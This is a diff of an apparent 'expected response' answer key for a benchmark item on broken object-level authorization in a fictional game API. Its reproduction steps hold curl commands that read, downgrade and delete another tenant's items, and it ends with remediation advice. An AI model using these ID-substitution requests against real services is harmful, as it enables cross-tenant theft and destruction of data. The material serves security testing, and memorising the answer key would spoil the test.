@@ -1,53 +1,72 @@
 # Expected Response
 
 ## System
-- Domain: Gaming / MMO Backend
-- System: RealmForge Game API
+- System: RealmForge Game API v3.3.0
+- Domain: GAMING / MMO BACKEND
 - Example ID: BOLA-0082
+- Risk ID: RISK-43-082
 
-## Priority Findings
+## Findings
 
-### Finding 1: Integrity downgrade via versioning (Pattern 4.3)
-**Severity:** Critical
-**Category:** Integrity
+### 1. Pattern 4.3 — Integrity Downgrade via Versioning: Cross-Tenant Game Item Access on `/api/v1/items/:id` (HAR Primary)
 
-**Summary:**
-The `/api/v1/resources` endpoint is vulnerable to Pattern 4.3 (Integrity downgrade via versioning).
-An authenticated user from `ORG-3B50` can access or modify objects owned by `ORG-066C`
-by manipulating the resource identifier in the request.
+The `GET/PATCH/DELETE /api/v1/items/:id` endpoint queries by `item_id` only, without filtering by `owner_id` or `tenant_id`. An attacker from `ORG-3B50` can:
 
-**Evidence from artifact:**
-- Request JWT `tenantId`: `ORG-3B50`
-- Response body `tenantId`: `ORG-066C` — confirms cross-tenant data returned
+1. **Read** another player's game items (virtual property theft — HAR primary).
+2. **Downgrade via PATCH:** Modify another player's item `status` or `sensitive_data` to a lower tier/version, degrading the integrity of their in-game equipment (Pattern 4.3 core).
+3. **Delete** another player's items, causing irreversible loss of virtual property.
+
+Pattern 4.3 "integrity downgrade via versioning" in the Gaming/MMO context: the attacker exploits the missing ownership check to roll back or degrade a victim player's item version/status (e.g., legendary → common tier), directly sabotaging their competitive standing and destroying virtual economy assets.
+
+**Evidence from HAR:**
+- Request: `GET /api/v1/items/ITE-2082` from `ORG-3B50`
+- Response `tenantId: "ORG-066C"` — cross-tenant access confirmed
+- Response `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-066C"` — game item data exposed
 - HTTP status: 200 — no authorization failure
-- `sensitiveData` field exposed across tenant boundary
 
-**Root Cause:**
-Database query does not include `WHERE owner_id = $authenticatedUserId AND tenant_id = $jwtTenantId`.
-The application trusts the path parameter alone.
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Authorize baseline
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.realmforge-game.example.com/api/v1/resources/RES-1082" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>"
+curl -s "https://api.realmforge-game.example.com/api/v1/items/ITE-1082" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
+  -H "X-Tenant-ID: ORG-3B50"
 ```
-Expected: Returns own record with `tenantId: "ORG-3B50"`.
+**Expected:** Returns own record with `tenantId: "ORG-3B50"`.
 
-### Step 2 — ID substitution
+**Step 2 — Cross-tenant game item read (primary HAR attack):**
 ```bash
-curl -s "https://api.realmforge-game.example.com/api/v1/resources/RES-2082" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>"
+curl -s "https://api.realmforge-game.example.com/api/v1/items/ITE-2082" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
+  -H "X-Tenant-ID: ORG-3B50"
 ```
-**Vulnerable:** Returns `tenantId: "ORG-066C"` and `sensitiveData`.
-**Secure:** HTTP 403 or 404.
+**Vulnerable outcome:** Returns `tenantId: "ORG-066C"` and victim's game item `sensitiveData` — virtual property exposure.
 
-### Step 3 — Variant tests based on Pattern 4.3
-No specific variant documented for Pattern 4.3 — use Steps 1-2.
+**Step 3 — Integrity downgrade: degrade victim's game item to lower version/tier (Pattern 4.3 primary):**
+```bash
+curl -s -X PATCH "https://api.realmforge-game.example.com/api/v1/items/ITE-2082" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
+  -H "X-Tenant-ID: ORG-3B50" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "deprecated", "sensitive_data": "tier_downgraded_to_common_by_attacker"}'
+```
+**Vulnerable outcome:** Victim's legendary/rare item degraded to `deprecated` status — integrity downgrade confirmed. In an MMO economy, this constitutes economic sabotage of the victim's virtual property.
+
+**Step 4 — Cross-tenant game item delete (irreversible property destruction):**
+```bash
+curl -s -X DELETE "https://api.realmforge-game.example.com/api/v1/items/ITE-2082" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
+  -H "X-Tenant-ID: ORG-3B50"
+```
+**Vulnerable outcome:** Victim's game item permanently deleted — virtual property loss.
+
+## Secure Outcome
+```json
+{ "error": "Forbidden", "code": 403 }
+```
 
 ## Remediation
-1. Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub` to all queries that accept user-supplied IDs.
-2. Centralise authorization middleware: never allow ID resolution without ownership check.
-3. Use non-sequential, randomly-generated UUIDs for object IDs to reduce enumeration risk.
-4. Add regression test: Tenant A token requests Tenant B ID — assert 403/404.
+- Add `WHERE item_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all item queries (RISK-43-082).
+- Centralize authorization middleware: never resolve IDs without ownership check.
+- Use non-sequential UUIDs for item IDs to reduce enumeration risk.
+- Add regression test: Tenant A token requests Tenant B item ID — assert 403/404.
